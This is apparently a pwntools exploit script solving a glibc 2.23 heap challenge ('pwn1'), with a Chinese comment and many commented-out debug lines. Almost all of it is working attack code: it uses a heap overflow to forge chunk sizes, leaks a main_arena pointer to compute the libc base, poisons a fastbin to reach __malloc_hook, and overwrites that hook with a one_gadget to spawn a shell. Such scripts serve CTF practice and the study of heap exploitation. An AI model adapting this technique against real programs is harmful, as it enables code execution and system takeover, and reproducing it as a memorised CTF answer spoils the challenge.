from pwn import *
#context(os='linux', arch='amd64', kernel='amd64')
context.log_level="debug"
#context.terminal=["tmux","splitw","-h"]
#io=gdb.debug("./pwn10")
libc=ELF("/home/yun/2.23/libc-2.23.so")
io=process("./pwn1")
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
#gdb.attach(io)

def Allocate(size):
    ru(b"Command:")
    sl(b"1")
    ru(b"Size:")
    sl(str(size))

def Fill(idx,content):
    ru(b"Command:")
    sl(b"2")
    ru(b"Index:")
    sl(str(idx))
    ru(b"Size:")
    sl(str(len(content)))
    ru(b"Content: ")
    sl(content)
def Free(idx):
    ru(b"Command:")
    sl(b"3")
    ru(b"Index:")
    sl(str(idx))

def Dump(idx):
    ru(b"Command:")
    sl(b"4")
    ru(b"Index:")
    sl(str(idx))
#    rl()
    #rl()
#   return  rl()
Allocate(0x80)  #0
Allocate(0x80)  #1
Allocate(0x80)  #2
Allocate(0x80)  #3
#pause()
#gdb.attach(io)
#Fill(0,b'a'*(0x80+8)+p64(0x120+1))
Free(1)
#gdb.attach(io)
#pause()

Fill(0,b'a'*(0x80+8)+p64(0x120+1))
#Allocate(0x80) #1
#gdb.attach(io)
#pause()
Allocate(0x110)  #1
#gdb.attach(io)
Fill(1,b'a'*(0x80+8)+p64(0x90+1))
Free(2)
#gdb.attach(io)
#pause()
Dump(1)
#gdb.attach(io)
#pause()

#ru(b"Content: ")
main_arena= u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

print("main_arena"+hex(main_arena))
#gdb.attach(io)
#pause()
_malloc_hook_addr=main_arena-0x68
print(hex(_malloc_hook_addr))

#gdb.attach(io)
#pause()
libc_base=_malloc_hook_addr-libc.sym['__malloc_hook']
print(hex(libc_base))

Allocate(0x80) #2


#shell=libc_base+0x4526a 
shell=libc_base+0x4526a #  0x4525a
Allocate(0x60) #4
Allocate(0x60) #5
Free(5)
#Fill(4,b'a'*(0x50+8)+p64(0x60+1)+p64(0x50)+p64(_malloc_hook_addr-0x23))

Fill(4,b'a'*(0x60+8)+p64(0x70+1)+p64(_malloc_hook_addr-0x23)+p64(0))
#fastbin后进先出,进入的时候，进入到下边。区的时候从下边取
Allocate(0x60) #5
#gdb.attach(io)
#pause()
Allocate(0x60) #6
Fill(6,b'a'*0x13+p64(shell))
#gdb.attach(io)
#pause()
#Fill(5,p8(0)*3+p64(0)*2+p64(libc_base+0x4526a))
print(hex(shell))
#gdb.attach(io)
#pause()
Allocate(0x10)
#gdb.attach(io)
#pause()
io.interactive()


